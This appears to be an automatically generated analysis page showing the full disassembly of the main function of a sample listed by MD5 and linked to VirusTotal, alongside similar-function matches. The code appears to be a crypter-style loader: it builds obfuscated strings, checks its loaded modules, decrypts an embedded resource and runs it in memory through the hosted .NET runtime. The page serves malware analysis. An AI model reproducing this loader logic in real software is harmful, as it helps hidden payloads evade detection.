---
layout: post
title:  "main @ d9409903542212823b7b4709144a636b"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** main
- **Origin (md5):** d9409903542212823b7b4709144a636b
- **VirusTotal:** [virustotal.com/gui/file/d9409903542212823b7b4709144a636b][virustotal_ref]

# Code Tags
<span class="tag" id="PROCESS">PROCESS</span>
<span class="tag" id="LINKING">LINKING</span>
<span class="tag" id="RESOURCE">RESOURCE</span>


# Similar Functions

1. [fcn.00474f00][similar_1_ref] (sim.: 0.9433920419755428)
2. [fcn.30781b10][similar_2_ref] (sim.: 0.9300195466226595)
3. [fcn.00466040][similar_3_ref] (sim.: 0.9297172585768303)
4. [fcn.004102e0][similar_4_ref] (sim.: 0.9180029908588184)
5. [fcn.64076e50][similar_5_ref] (sim.: 0.912815689857166)


# Disassembled Code

{% highlight nasm %}
sub esp,0x480
push ebx
push ebp
push esi
push edi
push 0
call dword[sym.imp.ole32.dll_OleInitialize]
lea eax,[esp+0x128]
push eax
lea ecx,[esp+0x14]
mov bl,0xd3
push ecx
mov byte[esp+0x18],0xe0
mov byte[esp+0x19],0x3b
mov byte[esp+0x1a],0x8d
mov byte[esp+0x1b],0x2a
mov byte[esp+0x1c],0xa2
mov byte[esp+0x1d],0x2a
mov byte[esp+0x1e],0x2a
mov byte[esp+0x1f],0x41
mov byte[esp+0x20],bl
mov byte[esp+0x21],0x20
mov byte[esp+0x22],0x64
mov byte[esp+0x23],6
mov byte[esp+0x24],0x8a
mov byte[esp+0x25],0xf7
mov byte[esp+0x26],0x3d
mov byte[esp+0x27],0x9d
mov byte[esp+0x28],0xd9
mov byte[esp+0x29],0xee
mov byte[esp+0x2a],0x15
mov byte[esp+0x2b],0x68
mov byte[esp+0x2c],0xf4
mov byte[esp+0x2d],0x76
mov byte[esp+0x2e],0xb9
mov byte[esp+0x2f],0x34
mov byte[esp+0x30],0xbf
mov byte[esp+0x31],0x1e
mov byte[esp+0x32],0xe7
mov byte[esp+0x33],0x78
mov byte[esp+0x34],0x98
mov byte[esp+0x35],0xe9
mov byte[esp+0x36],0x6f
mov byte[esp+0x37],0xb4
mov byte[esp+0x38],0
call fcn.00401650
push eax
call fcn.0040b95e
add esp,0xc
cmp eax,0x41b2a0
je 0x402439
call dword[sym.imp.KERNEL32.dll_GetCurrentProcessId]
push eax
push 8
call sub.KERNEL32.dll_CreateToolhelp32Snapshot
lea edx,[esp+0x26c]
mov esi,eax
push edx
push esi
mov dword[esp+0x274],0x224
mov byte[esp+0x60],0xce
mov byte[esp+0x61],0x27
mov byte[esp+0x62],0x9c
mov byte[esp+0x63],0x1a
mov byte[esp+0x64],0x95
mov byte[esp+0x65],0x2e
mov byte[esp+0x66],0x22
mov byte[esp+0x67],0x57
mov byte[esp+0x68],0x91
mov byte[esp+0x69],0x21
mov byte[esp+0x6a],0x57
mov byte[esp+0x6b],0x3a
mov byte[esp+0x6c],0xf8
mov byte[esp+0x6d],0x98
mov byte[esp+0x6e],0x5b
mov byte[esp+0x6f],0xf4
mov byte[esp+0x70],0xb5
mov byte[esp+0x71],0x87
mov byte[esp+0x72],0x7b
mov byte[esp+0x73],0xf
mov byte[esp+0x74],0xf4
mov byte[esp+0x75],0x76
mov byte[esp+0x76],0xb9
mov byte[esp+0x77],0x34
mov byte[esp+0x78],0xbf
mov byte[esp+0x79],0x1e
mov byte[esp+0x7a],0xe7
mov byte[esp+0x7b],0x78
mov byte[esp+0x7c],0x98
mov byte[esp+0x7d],0xe9
mov byte[esp+0x7e],0x6f
mov byte[esp+0x7f],0xb4
mov byte[esp+0x80],0
mov byte[esp+0x18],0xc0
mov byte[esp+0x19],0x38
mov byte[esp+0x1a],0x8d
mov byte[esp+0x1b],0x1f
mov byte[esp+0x1c],0x8e
mov byte[esp+0x1d],0x30
mov byte[esp+0x1e],0x65
mov byte[esp+0x1f],0x47
mov byte[esp+0x20],bl
mov byte[esp+0x21],0x29
mov byte[esp+0x22],0x3b
mov byte[esp+0x23],0x56
mov byte[esp+0x24],0xf8
mov byte[esp+0x25],0x98
mov byte[esp+0x26],0x5b
mov byte[esp+0x27],0xf4
mov byte[esp+0x28],0xb5
mov byte[esp+0x29],0x87
mov byte[esp+0x2a],0x7b
mov byte[esp+0x2b],0xf
mov byte[esp+0x2c],0xf4
mov byte[esp+0x2d],0x76
mov byte[esp+0x2e],0xb9
mov byte[esp+0x2f],0x34
mov byte[esp+0x30],0xbf
mov byte[esp+0x31],0x1e
mov byte[esp+0x32],0xe7
mov byte[esp+0x33],0x78
mov byte[esp+0x34],0x98
mov byte[esp+0x35],0xe9
mov byte[esp+0x36],0x6f
mov byte[esp+0x37],0xb4
mov byte[esp+0x38],0
call sub.KERNEL32.dll_Module32First
test eax,eax
je 0x401d43
lea eax,[esp+0xc8]
push eax
lea ecx,[esp+0x5c]
push ecx
call fcn.00401650
add esp,8
lea edx,[esp+0x28c]
mov cl,byte[edx]
cmp cl,byte[eax]
jne 0x401c17
test cl,cl
je 0x401c13
mov cl,byte[edx+1]
cmp cl,byte[eax+1]
jne 0x401c17
add edx,2
add eax,2
test cl,cl
jne 0x401bf7
xor eax,eax
jmp 0x401c1c
sbb eax,eax
sbb eax,0xffffffff
test eax,eax
jne 0x401c34
push esi
call dword[sym.imp.KERNEL32.dll_CloseHandle]
xor eax,eax
pop edi
pop esi
pop ebp
pop ebx
add esp,0x480
ret
lea edx,[esp+0xa8]
push edx
lea eax,[esp+0x14]
push eax
call fcn.00401650
add esp,8
lea ecx,[esp+0x28c]
mov dl,byte[ecx]
cmp dl,byte[eax]
jne 0x401c70
test dl,dl
je 0x401c6c
mov dl,byte[ecx+1]
cmp dl,byte[eax+1]
jne 0x401c70
add ecx,2
add eax,2
test dl,dl
jne 0x401c50
xor eax,eax
jmp 0x401c75
sbb eax,eax
sbb eax,0xffffffff
test eax,eax
je 0x401c20
lea ecx,[esp+0x26c]
push ecx
push esi
call sub.KERNEL32.dll_Module32Next
test eax,eax
je 0x401d43
nop
lea edx,[esp+0xc8]
push edx
lea eax,[esp+0x5c]
push eax
call fcn.00401650
add esp,8
lea ecx,[esp+0x28c]
lea esp,[esp]
mov dl,byte[ecx]
cmp dl,byte[eax]
jne 0x401cd0
test dl,dl
je 0x401ccc
mov dl,byte[ecx+1]
cmp dl,byte[eax+1]
jne 0x401cd0
add ecx,2
add eax,2
test dl,dl
jne 0x401cb0
xor eax,eax
jmp 0x401cd5
sbb eax,eax
sbb eax,0xffffffff
test eax,eax
je 0x401c20
lea ecx,[esp+0xa8]
push ecx
lea edx,[esp+0x14]
push edx
call fcn.00401650
add esp,8
lea ecx,[esp+0x28c]
lea esp,[esp]
mov dl,byte[ecx]
cmp dl,byte[eax]
jne 0x401d20
test dl,dl
je 0x401d1c
mov dl,byte[ecx+1]
cmp dl,byte[eax+1]
jne 0x401d20
add ecx,2
add eax,2
test dl,dl
jne 0x401d00
xor eax,eax
jmp 0x401d25
sbb eax,eax
sbb eax,0xffffffff
test eax,eax
je 0x401c20
lea eax,[esp+0x26c]
push eax
push esi
call sub.KERNEL32.dll_Module32Next
test eax,eax
jne 0x401c90
push esi
call dword[sym.imp.KERNEL32.dll_CloseHandle]
push 0
call dword[sym.imp.KERNEL32.dll_GetModuleHandleA]
push 0xa
lea ecx,[esp+0x14c]
push ecx
lea edx,[esp+0x18]
push edx
mov ebp,eax
mov byte[esp+0x1c],0xfc
mov byte[esp+0x1d],0xb
mov byte[esp+0x1e],0xff
mov byte[esp+0x1f],0x75
mov byte[esp+0x20],0xe7
mov byte[esp+0x21],0x44
mov byte[esp+0x22],0x4b
mov byte[esp+0x23],0x23
mov byte[esp+0x24],0xbf
mov byte[esp+0x25],0x45
mov byte[esp+0x26],0x3b
mov byte[esp+0x27],0x56
mov byte[esp+0x28],0xf8
mov byte[esp+0x29],0x98
mov byte[esp+0x2a],0x5b
mov byte[esp+0x2b],0xf4
mov byte[esp+0x2c],0xb5
mov byte[esp+0x2d],0x87
mov byte[esp+0x2e],0x7b
mov byte[esp+0x2f],0xf
mov byte[esp+0x30],0xf4
mov byte[esp+0x31],0x76
mov byte[esp+0x32],0xb9
mov byte[esp+0x33],0x34
mov byte[esp+0x34],0xbf
mov byte[esp+0x35],0x1e
mov byte[esp+0x36],0xe7
mov byte[esp+0x37],0x78
mov byte[esp+0x38],0x98
mov byte[esp+0x39],0xe9
mov byte[esp+0x3a],0x6f
mov byte[esp+0x3b],0xb4
mov byte[esp+0x3c],0
call fcn.00401650
add esp,8
push eax
push ebp
call dword[sym.imp.KERNEL32.dll_FindResourceA]
mov edi,eax
push edi
push ebp
mov dword[esp+0x54],edi
call dword[sym.imp.KERNEL32.dll_LoadResource]
mov esi,eax
push esi
call dword[sym.imp.KERNEL32.dll_LockResource]
push edi
push ebp
mov ebx,eax
call dword[sym.imp.KERNEL32.dll_SizeofResource]
push eax
call fcn.0040b80d
push 0x40022
mov edi,eax
call fcn.0040af26
add esp,8
mov dword[esp+0x50],eax
test eax,eax
je 0x401e70
push 0x40022
push 0
push eax
call fcn.0040b9f0
mov ecx,dword[esp+0x5c]
add esp,0xc
mov dword[esp+0x38],ecx
jmp 0x401e78
mov dword[esp+0x38],0
mov ecx,dword[esp+0x38]
call fcn.00401300
mov edx,dword[esp+0x4c]
push edx
push ebp
call dword[sym.imp.KERNEL32.dll_SizeofResource]
mov dword[esp+0x3c],eax
cdq
and edx,0x3ff
add eax,edx
sar eax,0xa
test eax,eax
jle 0x401eec
mov ecx,edi
sub ecx,ebx
mov dword[esp+0x50],ebx
mov dword[esp+0x80],ecx
mov dword[esp+0x48],eax
jmp 0x401ec0
mov eax,dword[esp+0x50]
mov ecx,dword[esp+0x80]
add ecx,eax
push ecx
mov ecx,dword[esp+0x3c]
push 0x400
push eax
call fcn.00401560
add dword[esp+0x50],0x400
sub dword[esp+0x48],1
jne 0x401ec0
mov ecx,dword[esp+0x3c]
and ecx,0x800003ff
jns 0x401f00
dec ecx
or ecx,0xfffffc00
inc ecx
test ecx,ecx
jle 0x401f1b
mov eax,dword[esp+0x3c]
sub eax,ecx
lea edx,[eax+edi]
push edx
push ecx
mov ecx,dword[esp+0x40]
add eax,ebx
push eax
call fcn.00401560
mov eax,dword[esp+0x3c]
push eax
push 0
push ebx
call fcn.0040b9f0
add esp,0xc
push esi
call dword[sym.imp.KERNEL32.dll_FreeResource]
mov ebx,dword[edi]
push ebx
mov dword[esp+0x88],ebx
call fcn.0040b80d
mov ecx,dword[esp+0x50]
add esp,4
push ecx
push ebp
mov esi,eax
call dword[sym.imp.KERNEL32.dll_SizeofResource]
push eax
lea edx,[edi+4]
push edx
lea eax,[esp+0x8c]
push eax
push esi
call fcn.0040ac10
mov ecx,dword[esp+0x4c]
push ecx
push 0
push edi
call fcn.0040b9f0
lea edx,[esp+0x124]
push edx
lea eax,[esp+0x30]
push eax
lea ebp,[esi+0xe]
mov byte[esp+0x34],0xce
mov byte[esp+0x35],0x27
mov byte[esp+0x36],0x9c
mov byte[esp+0x37],0x1a
mov byte[esp+0x38],0x95
mov byte[esp+0x39],0x21
mov byte[esp+0x3a],0x2e
mov byte[esp+0x3b],0xd
mov byte[esp+0x3c],0xdb
mov byte[esp+0x3d],0x29
mov byte[esp+0x3e],0x57
mov byte[esp+0x3f],0x56
mov byte[esp+0x40],0xf8
mov byte[esp+0x41],0x98
mov byte[esp+0x42],0x5b
mov byte[esp+0x43],0xf4
mov byte[esp+0x44],0xb5
mov byte[esp+0x45],0x87
mov byte[esp+0x46],0x7b
mov byte[esp+0x47],0xf
mov byte[esp+0x48],0xf4
mov byte[esp+0x49],0x76
mov byte[esp+0x4a],0xb9
mov byte[esp+0x4b],0x34
mov byte[esp+0x4c],0xbf
mov byte[esp+0x4d],0x1e
mov byte[esp+0x4e],0xe7
mov byte[esp+0x4f],0x78
mov byte[esp+0x50],0x98
mov byte[esp+0x51],0xe9
mov byte[esp+0x52],0x6f
mov byte[esp+0x53],0xb4
mov byte[esp+0x54],0
call fcn.00401650
add esp,0x24
push eax
call dword[sym.imp.KERNEL32.dll_LoadLibraryA]
mov edi,eax
mov byte[esp+0x10],0xe0
mov byte[esp+0x11],0x18
mov byte[esp+0x12],0xad
mov byte[esp+0x13],0x36
mov byte[esp+0x14],0x95
mov byte[esp+0x15],0x21
mov byte[esp+0x16],0x2a
mov byte[esp+0x17],0x57
lea ecx,[esp+0xe8]
push ecx
lea edx,[esp+0x14]
push edx
mov byte[esp+0x20],0xda
mov byte[esp+0x21],0xc
mov byte[esp+0x22],0x55
mov byte[esp+0x23],0x25
mov byte[esp+0x24],0x8c
mov byte[esp+0x25],0xf9
mov byte[esp+0x26],0x35
mov byte[esp+0x27],0x97
mov byte[esp+0x28],0xd0
mov byte[esp+0x29],0x87
mov byte[esp+0x2a],0x7b
mov byte[esp+0x2b],0xf
mov byte[esp+0x2c],0xf4
mov byte[esp+0x2d],0x76
mov byte[esp+0x2e],0xb9
mov byte[esp+0x2f],0x34
mov byte[esp+0x30],0xbf
mov byte[esp+0x31],0x1e
mov byte[esp+0x32],0xe7
mov byte[esp+0x33],0x78
mov byte[esp+0x34],0x98
mov byte[esp+0x35],0xe9
mov byte[esp+0x36],0x6f
mov byte[esp+0x37],0xb4
mov byte[esp+0x38],0
call fcn.00401650
add esp,8
push eax
push edi
call dword[sym.imp.KERNEL32.dll_GetProcAddress]
mov dword[0x423480],eax
xor edi,edi
push 3
lea eax,[esp+0x170]
push esi
lea ecx,[esp+0x170]
mov dword[esp+0x84],edi
mov dword[esp+0x4c],edi
mov dword[esp+0x48],edi
mov byte[esp+0x3f],0
mov dword[esp+0x170],eax
call fcn.004018d0
lea ecx,[esp+0x7c]
push ecx
push 0x41b230
push 0x41b220
push edi
push 0x41b298
push str.v2.0.50727
call sub.mscoree.dll_CorBindToRuntimeEx
test eax,eax
jl 0x4021c3
mov eax,dword[esp+0x7c]
mov edx,dword[eax]
push eax
mov eax,dword[edx+0x28]
call eax
test eax,eax
jl 0x4021c5
mov eax,dword[esp+0x44]
cmp eax,edi
je 0x402175
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
mov eax,dword[esp+0x7c]
lea edx,[esp+0x44]
mov dword[esp+0x44],edi
mov ecx,dword[eax]
push edx
push eax
mov eax,dword[ecx+0x34]
call eax
mov esi,dword[esp+0x44]
cmp esi,edi
jne 0x40219c
push 0x80004003
call fcn.0040ad50
mov eax,dword[esp+0x40]
cmp eax,edi
je 0x4021ac
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
lea ecx,[esp+0x40]
push ecx
mov dword[esp+0x44],edi
mov eax,dword[esi]
mov edx,dword[eax]
push 0x41b270
push esi
call edx
jmp 0x4021ca
xor edi,edi
mov byte[esp+0x37],1
mov eax,dword[esp+0x168]
lea ecx,[esp+0x16c]
cmp eax,ecx
je 0x4021e5
push eax
call fcn.0040b675
add esp,4
cmp byte[esp+0x37],0
jne 0x402419
push 0x41b268
lea ecx,[esp+0x4c]
mov dword[esp+0x3c],edi
call fcn.00401870
mov esi,dword[sym.imp.OLEAUT32.dll_VariantClear]
lea edx,[esp+0x88]
push edx
mov dword[esp+0x40],edi
call esi
push 0x41b260
lea ecx,[esp+0x84]
call fcn.00401870
lea eax,[esp+0x98]
push eax
call esi
lea ecx,[esp+0x50]
push ecx
push 1
add ebx,0xfffffff2
push 0x11
mov dword[esp+0x5c],ebx
mov dword[esp+0x60],edi
call dword[sym.imp.OLEAUT32.dll_SafeArrayDestroy]
lea edx,[esp+0x4c]
mov esi,eax
push edx
push esi
mov dword[esp+0x54],edi
call dword[sym.imp.OLEAUT32.dll_SafeArrayUnaccessData]
mov eax,dword[esp+0x4c]
push ebx
push ebp
push eax
call fcn.0040b310
add esp,0xc
push esi
call dword[sym.imp.OLEAUT32.dll_SafeArrayGetElement]
mov eax,dword[esp+0x40]
cmp eax,edi
jne 0x402285
push 0x80004003
call fcn.0040ad50
mov ebx,eax
mov eax,dword[esp+0x38]
cmp eax,edi
je 0x402297
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
lea ecx,[esp+0x38]
push ecx
mov dword[esp+0x3c],edi
mov eax,dword[ebx]
mov edx,dword[eax+0xb4]
push esi
push ebx
call edx
cmp esi,edi
je 0x4022b7
push esi
call dword[sym.imp.OLEAUT32.dll_SafeArrayGetDim]
mov esi,dword[esp+0x38]
cmp esi,edi
jne 0x4022c9
push 0x80004003
call fcn.0040ad50
mov eax,dword[esp+0x3c]
cmp eax,edi
je 0x4022d9
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
mov eax,dword[esp+0x48]
mov dword[esp+0x3c],edi
cmp eax,edi
je 0x4022e9
mov eax,dword[eax]
jmp 0x4022eb
xor eax,eax
mov ecx,dword[esi]
lea edx,[esp+0x3c]
push edx
push eax
mov eax,dword[ecx+0x44]
push esi
call eax
push edi
push edi
push 0xc
call dword[sym.imp.OLEAUT32.dll_SafeArrayCopyData]
mov ecx,dword[esp+0x3c]
cmp ecx,edi
jne 0x402315
push 0x80004003
call fcn.0040ad50
mov esi,dword[esp+0x80]
cmp esi,edi
je 0x402324
mov edx,dword[esi]
jmp 0x402326
xor edx,edx
mov ebp,dword[esp+0x88]
mov ebx,dword[ecx]
lea eax,[esp+0x98]
push eax
push edi
sub esp,0x10
mov eax,esp
mov dword[eax],ebp
mov ebp,dword[esp+0xa4]
push edi
mov dword[eax+4],ebp
mov ebp,dword[esp+0xac]
push 0x118
mov dword[eax+8],ebp
mov ebp,dword[esp+0xb4]
push edx
push ecx
mov ecx,dword[ebx+0xe4]
mov dword[eax+0xc],ebp
call ecx
mov ebx,dword[sym.imp.OLEAUT32.dll_VariantCopy]
lea edx,[esp+0x98]
push edx
call ebx
mov ebp,dword[sym.imp.KERNEL32.dll_InterlockedDecrement]
cmp esi,edi
je 0x4023b7
lea eax,[esi+8]
push eax
call ebp
test eax,eax
jne 0x4023b7
mov eax,dword[esi]
cmp eax,edi
je 0x40239e
push eax
call dword[sym.imp.OLEAUT32.dll_SysStringLen]
mov eax,dword[esi+4]
cmp eax,edi
je 0x4023ae
push eax
call fcn.0040af8b
add esp,4
push esi
call fcn.0040ae80
add esp,4
lea ecx,[esp+0x88]
push ecx
call ebx
mov eax,dword[esp+0x3c]
cmp eax,edi
je 0x4023d1
mov edx,dword[eax]
push eax
mov eax,dword[edx+8]
call eax
mov esi,dword[esp+0x48]
cmp esi,edi
je 0x402409
lea ecx,[esi+8]
push ecx
call ebp
test eax,eax
jne 0x402409
mov eax,dword[esi]
cmp eax,edi
je 0x4023f0
push eax
call dword[sym.imp.OLEAUT32.dll_SysStringLen]
mov eax,dword[esi+4]
cmp eax,edi
je 0x402400
push eax
call fcn.0040af8b
add esp,4
push esi
call fcn.0040ae80
add esp,4
mov eax,dword[esp+0x38]
cmp eax,edi
je 0x402419
mov edx,dword[eax]
push eax
mov eax,dword[edx+8]
call eax
mov eax,dword[esp+0x40]
cmp eax,edi
je 0x402429
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
mov eax,dword[esp+0x44]
cmp eax,edi
je 0x402439
mov ecx,dword[eax]
mov edx,dword[ecx+8]
push eax
call edx
pop edi
pop esi
pop ebp
xor eax,eax
pop ebx
add esp,0x480
ret
{% endhighlight %}


[similar_1_ref]: /report/fcn.00474f00@4fe6510221c33bf023f6abed461fc13f
[similar_2_ref]: /report/fcn.30781b10@e0efd357fccc8f4e2c059b0b54118ba8
[similar_3_ref]: /report/fcn.00466040@4fe6510221c33bf023f6abed461fc13f
[similar_4_ref]: /report/fcn.004102e0@4fe6510221c33bf023f6abed461fc13f
[similar_5_ref]: /report/fcn.64076e50@07e4412910bcf0f5969ef64c44eecb2d
[virustotal_ref]: https://www.virustotal.com/gui/file/d9409903542212823b7b4709144a636b